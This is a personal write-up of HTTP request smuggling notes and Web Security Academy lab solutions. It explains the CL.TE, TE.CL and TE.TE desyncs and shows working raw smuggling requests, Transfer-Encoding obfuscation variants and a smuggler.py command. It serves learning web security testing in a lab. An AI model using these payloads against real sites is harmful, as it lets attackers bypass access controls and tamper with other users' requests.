# What is HTTP request smuggling?
- HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. 
- Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
- Request smuggling is primarily associated with HTTP/1 requests. 
- However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

# What happens in an HTTP request smuggling attack?
- Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. 
- Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. 
- This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.
- When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. 
- The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins
- In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. 
- Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems
- Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. 
- It is effectively prepended to the next request, and so can interfere with the way the application processes that request. 
- This is a request smuggling attack, and it can have devastating results.

# How do HTTP request smuggling vulnerabilities arise?
- Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
```HTTP
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. 
- This means that the message body contains one or more chunks of data. 
- Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. 
- The message is terminated with a chunk of size zero. For example:
```HTTP
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```
- As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. 
- The specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. 
- This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. 
- In this situation, problems can arise for two reasons:
- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
- If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.


# Note
- Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. 
- As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.
- However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. 
- This means that the front-end effectively has to translate the requests it receives into HTTP/1. 
- This process is known as HTTP downgrading. For more information, see Advanced request smuggling.


# How to perform an HTTP request smuggling attack
- Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. 
- The exact way in which this is done depends on the behavior of the two servers:
1. CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
2. TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
3. TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

## Note
- These techniques are only possible using HTTP/1 requests. 
- Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.
- As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. 
- You can do this from the Request attributes section of the Inspector panel.

# CL.TE vulnerabilities
- Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. 
- We can perform a simple HTTP request smuggling attack as follows:
```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0


SMUGGLED
```
- The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. 
- This request is forwarded on to the back-end server.
- The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. 
- It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. 
- The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.


# Lab: HTTP request smuggling, basic CL.TE vulnerability
- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. 
- The front-end server rejects requests that aren't using the GET or POST method.
- To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

# Solution
- I Solved this lab by sending the request to burp request smuggler
- And I also solved it with the repeater
```HTTP
POST / HTTP/1.1
Host: 0adc004c031189d381c4668200d6003b.web-security-academy.net
Cookie: session=BM0Xv7DE2EGm5kAgVWIptiE54bc46p3e
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adc004c031189d381c4668200d6003b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

G

```
- Then I sent the request twice
- I also solve it using defParam smugller in the command-line by running:
```
python3 smuggler.py -u 0adc004c031189d381c4668200d6003b.web-security-academy.net/ 
```
- This gives potential CL.TE errors


# TE.CL vulnerabilities
- Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 
- We can perform a simple HTTP request smuggling attack as follows:
```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Note
- To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
- You need to include the trailing sequence \r\n\r\n following the final 0.

- The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. 
- It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. 
- It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. 
- This request is forwarded on to the back-end server.
- The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. 
- The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

# Lab: HTTP request smuggling, basic TE.CL vulnerability
- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. 
- The front-end server rejects requests that aren't using the GET or POST method.
- To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

# Solution
- I fired this request
```
POST / HTTP/1.1
Host: 0ab700fb03ff63d58109a8b100b50039.web-security-academy.net
Cookie: session=f2cBHaynUWRBcraEiI0vp97NfY8ShVHc
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab700fb03ff63d58109a8b100b50039.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
tRANSFER-ENCODING: chunked
Connection: close

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=y
0

```
- The 5c is the total length from GPOST to x=y


# TE.TE behavior: obfuscating the TE header
- Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
- There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

- Each of these techniques involves a subtle departure from the HTTP specification. 
- Real-world code that implements a protocol specification rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the specification. 
- To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
- Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described.

# Lab: HTTP request smuggling, obfuscating the TE header
- This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. 
- The front-end server rejects requests that aren't using the GET or POST method.
- To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

# Solution
- Using the http probe in request smuggler, I could get this request to work
```HTTP
POST / HTTP/1.1
Host: 0aa300230341c1b68198ac9500bc0014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: beejay
Content-Length: 4

5C
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=y
0

```
- By sending this request twice I was able to solve the lab